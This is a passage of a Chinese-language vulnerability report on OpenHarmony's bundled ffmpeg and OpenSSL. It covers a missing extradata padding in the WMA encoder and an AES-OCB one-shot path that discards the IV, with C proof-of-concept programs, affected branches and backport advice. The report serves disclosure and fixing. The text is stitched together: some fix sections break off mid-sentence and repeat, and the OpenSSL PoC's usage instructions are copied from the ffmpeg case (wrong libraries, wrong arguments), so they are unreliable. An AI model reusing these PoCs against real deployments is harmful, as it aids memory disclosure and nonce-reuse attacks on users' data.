     清单含 7.1.1——结构性证据成立；上游修复 diff 对 OH 检出
     git apply --check 直接通过。
  如需运行级观测：以 WMAV1/WMAV2 编码初始化后在消费侧
  （ff_wma_init 等按填充读 extradata 的路径）以 ASan 观测
  heap-buffer-overflow READ。

**影响路径**：前提条件：产品使用 ffmpeg 的 WMA 编码器初始化路径，且下游存在
按填充约定块读 extradata 的消费方（转码管线中编码参数回读/
容器封装回读等场景）。该缺陷为编码器初始化路径的分配问题，
触发不依赖攻击者直接输入内容；越界读影响为潜在信息泄露或
崩溃（实际影响取决于消费方读取模式）。

四、PoC & Exploit：

无运行级 PoC（原因如上）；证据为三侧源码对照（上游已修 diff /
OH 检出修复前形态逐行对应 / 官方受影响清单含基线版本），附件
patch.diff 为可直接应用的修复（git apply --check 通过）。

五、修复及缓解措施建议：

回移上游修复 23227a44：wmaenc.c encode_init 的两处 extradata
分配均附加 AV_INPUT_BUFFER_PADDING_SIZE（附件 patch.diff 即上游
原文，对 OH 检出直接适用）。同时建议评估组件内其他 extradata
手工分配点是否存在同类缺填充形态（上游在本修复同期对多处
extradata 分配做过同类加固，可按上游提交历史

### 3. PoC 源代码

```c
/*
 * CVE-2026-52296 运行验证 PoC — third_party/ffmpeg wmaenc extradata 缺填充
 *
 * 缺陷：wmaenc.c encode_init 为 extradata 分配 av_malloc(4)/av_mallocz(10)
 * 不带 AV_INPUT_BUFFER_PADDING_SIZE → 下游按填充约定块读 extradata 越界读。
 * 上游修复：FFmpeg 23227a44 (2026-05-03) 补齐填充。
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_wmaenc trigger|control
 *   trigger: WMAV1 编码初始化后在消费侧以 64 位块读 extradata → ASan 越界读
 *   control: 手动附加 PADDING 后读取 → 正常
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavcodec/avcodec.h>
#include <libavutil/mem.h>
#include <libavutil/opt.h>

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

    const AVCodec *codec = avcodec_find_encoder(AV_CODEC_ID_WMAV1);
    if (!codec) { fprintf(stderr, "WMAV1 encoder not found\n"); return 2; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 3;

    ctx->sample_rate = 44100;
    ctx->channels = 2;
    ctx->channel_layout = AV_CH_LAYOUT_STEREO;
    ctx->sample_fmt = AV_SAMPLE_FMT_S16;
    ctx->bit_rate = 128000;
    ctx->block_align = 0; /* let encoder compute */

    if (avcodec_open2(ctx, codec, NULL) < 0) {
        fprintf(stderr, "avcodec_open2 failed\n"); return 4;
    }

    fprintf(stdout, "extradata_size=%d\n", ctx->extradata_size);

    if (is_trigger) {
        /* 模拟下游按 FFmpeg 约定以 64 位块读 extradata（ff_wma_init 等路径）。
         * extradata 分配为 4 字节不带填充 → 读第 4-7 字节时越界 */
        fprintf(stdout, "reading extradata beyond allocation...\n");
        uint64_t val;
        memcpy(&val, ctx->extradata + 4, 8); /* read bytes 4-11: past 4-byte alloc */
        fprintf(stdout, "read value: %016llx\n", (unsigned long long)val);
    } else {
        /* Control: 只读合法范围内的数据 */
        uint32_t val;
        memcpy(&val, ctx->extradata, 4);
        fprintf(stdout, "in-bounds read: %08x\n", val);
    }

    avcodec_free_context(&ctx);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 23227a44：wmaenc.c encode_init 的两处 extradata
分配均附加 AV_INPUT_BUFFER_PADDING_SIZE（附件 patch.diff 即上游
原文，对 OH 检出直接适用）。同时建议评估组件内其他 extradata
手工分配点是否存在同类缺填充形态（上游在本修复同期对多处
extradata 分配做过同类加固，可按上游提交历史对照排查）。



---

## openssl-ocb-oneshot-iv-discard

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/openssl |
| 源码文件 | providers/implementations/ciphers/cipher_aes_ocb.c |
| 关键行号 | [497] |
| CVE 编号 | CVE-2026-45445 |
| CWE 分类 | CWE-325 |

> 源码片段见 `providers/implementations/ciphers/cipher_aes_ocb.c`（关键行号 [497]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：见 PoC 注释

**影响路径**：前提条件：产品/应用使用 AES-OCB 且经 EVP_Cipher() 一次性接口
加密（高吞吐批量加密的常见写法），且加密前未对该上下文做过
streaming 调用。攻击者无需直接权限：只要能观测/收集同密钥下
多条此形态的密文（网络流量、存储的加密记录），即可利用 OCB
nonce 重用攻破机密性；IV 由调用方正常轮换也无法缓解（被静默
丢弃）。是否需要用户交互取决于业务形态。

四、PoC & Exploit：

见附件 poc_ocb_iv.c 与运行验证记录.md（2×2 结果矩阵；密码学
等价对比法，环境 WSL2 Ubuntu 24.04、clang 18.1.3、OH 检出静态
构建）。本报告未构造针对真实业务密文的利用，nonce 重用的危害
为 OCB 模式公开密码学性质。

五、修复及缓解措施建议：

回移上游修复 843c9b94（附件 patch.diff 为窄化版，对 OH 检出
git apply --check 直接通过）：aes_ocb_cipher() 处理数据前检查
key_set 并调用 update_iv() 刷入缓冲 IV。建议同步引

### 3. PoC 源代码

```c
/*
 * CVE-2026-45445 运行验证 PoC — third_party_openssl AES-OCB EVP_Cipher() IV 丢弃
 *
 * 缺陷：aes_ocb_cipher()（OCB provider 的 OSSL_FUNC_CIPHER_CIPHER one-shot
 * 槽位）处理数据前不调用 update_iv()——调用方 IV 被静默丢弃，OCB
 * 有效 nonce 恒 0。上游修复：openssl/openssl 843c9b94（2026-06-09
 * 公告批次）。OH third_party_openssl（3.0.9 基线）为修复前形态。
 *
 * 两个观测场景（均对同一 (key, iv) 对比 one-shot 与 streaming 槽位）：
 *   S1 无 AAD：body 直接经 EVP_Cipher()（one-shot）vs
 *      EVP_EncryptUpdate/Final（streaming）。
 *      ——IV 丢弃的最纯粹观测：one-shot 从未走过任何 streaming 调用，
 *      修复前其加密 Offset 为 0，密文必然不同。
 *   S2 AAD 走 streaming、body 走 one-shot（上游修复测试描述的自然
 *      调用形态），两侧 body 后都正确 Final 再取 tag。
 * 判读：原版构建至少一个场景 ct/tag 不一致（缺陷观测，退出码 1）；
 *       补丁版两场景全一致（退出码 0）。
 */
#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>

typedef struct { unsigned char ct[64]; unsigned char tag[16]; int ok; } Result;

static Result run(int oneshot_body, int with_aad)
{
    Result r = {{0}, {0}, 1};
    unsigned char key[32], iv[12], aad[16], pt[64], tmp[16];
    for (int i = 0; i < 32; i++) key[i] = (unsigned char)(i + 1);
    for (int i = 0; i < 12; i++) iv[i] = (unsigned char)(0xA0 + i);
    for (int i = 0; i < 16; i++) aad[i] = (unsigned char)(0x10 + i);
    for (int i = 0; i < 64; i++) pt[i] = (unsigned char)(i);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len = 0, flen = 0;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_ocb(), NULL, NULL, NULL) != 1
        || EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, NULL) != 1
        || EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv) != 1) {
        r.ok = 0; EVP_CIPHER_CTX_free(ctx); return r;
    }
    if (with_aad && EVP_EncryptUpdate(ctx, NULL, &len, aad, sizeof(aad)) != 1) {
        r.ok = 0; EVP_CIPHER_CTX_free(ctx); return r;
    }
    if (oneshot_body) {
        if (EVP_Cipher(ctx, r.ct, pt, sizeof(pt)) != (int)sizeof(pt)) {
            r.ok = -1; EVP_CIPHER_CTX_free(ctx); return r;
        }
    } else {
        if (EVP_EncryptUpdate(ctx, r.ct, &len, pt, sizeof(pt)) != 1) {
            r.ok = -2; EVP_CIPHER_CTX_free(ctx); return r;
        }
    }
    /* AEAD 收尾（tag 就绪）——两条路径统一走 Final */
    if (EVP_EncryptFinal_ex(ctx, tmp, &flen) != 1) {
        r.ok = -3; EVP_CIPHER_CTX_free(ctx); return r;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_GET_TAG, 16, r.tag) != 1) {
        r.ok = -4;
    }
    EVP_CIPHER_CTX_free(ctx);
    return r;
}

static int scenario(int with_aad, const char *name)
{
    Result a = run(1, with_aad), b = run(0, with_aad);
    if (a.ok != 1 || b.ok != 1) {
        printf("%s SETUP_FAIL %d/%d\n", name, a.ok, b.ok);
        return 2;
    }
    int ct_eq = memcmp(a.ct, b.ct, sizeof(a.ct)) == 0;
    int tag_eq = memcmp(a.tag, b.tag, sizeof(a.tag)) == 0;
    printf("%s ct=%s tag=%s\n", name, ct_eq ? "SAME" : "DIFF", tag_eq ? "SAME" : "DIFF");
    return (ct_eq && tag_eq) ? 0 : 1;
}

int main(void)
{
    int s1 = scenario(0, "S1_noAAD_body_oneshot_vs_streaming");
    int s2 = scenario(1, "S2_AADstream_body_oneshot_vs_streaming");
    if (s1 == 0 && s2 == 0) {
        printf("VERDICT: OK (one-shot respects IV in both shapes)\n");
        return 0;
    }
    printf("VERDICT: VULNERABLE (one-shot output differs from streaming — IV discarded, effective nonce 0)\n");
    return 1;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/openssl

**影响的功能模块**：openssl

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 843c9b94（附件 patch.diff 为窄化版，对 OH 检出
git apply --check 直接通过）：aes_ocb_cipher() 处理数据前检查
key_set 并调用 update_iv() 刷入缓冲 IV。建议同步引入上游配套
测试（one-shot 与 streaming 交叉往返矩阵）。临时缓解：应用侧
避免对 AES-OCB 使用 EVP_Cipher() 一次性接口，改用
EVP_EncryptUpdate/EVP_EncryptFinal_ex 序列（streaming 槽位不受
影响）；或升级至上游公告列出的修复版本。



---
